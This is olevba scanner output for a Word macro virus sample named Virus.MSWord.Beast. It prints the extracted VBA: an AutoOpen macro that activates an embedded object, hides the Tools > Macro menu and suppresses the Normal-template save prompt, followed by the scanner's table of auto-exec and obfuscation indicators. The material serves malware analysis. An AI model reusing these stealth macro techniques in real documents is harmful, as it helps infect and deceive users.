olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  If DateDiff("s", CDate(GetSetting("3BEPb", "Startup", "date", 0)), Time) > 300 Then
    ActiveDocument.Shapes("3BEPb").Activate
    Selection.HomeKey Unit:=wdStory
    CommandBars("Tools").Controls("Macro").Visible = False
    Options.SaveNormalPrompt = False
  End If
End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()

End Sub
-------------------------------------------------------------------------------
VBA MACRO CyberForm 
in file: Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976 - OLE stream: 'CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









































































































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Booke
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Casper'S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WinK'S@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Beast-fba313d75988129f0fa4cfcadc85199d4a451976' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|/                   |2F0D432E                                     |
|          |C.                  |                                             |
|Hex String|/                   |2F0D4321                                     |
|          |C!                  |                                             |
+----------+--------------------+---------------------------------------------+

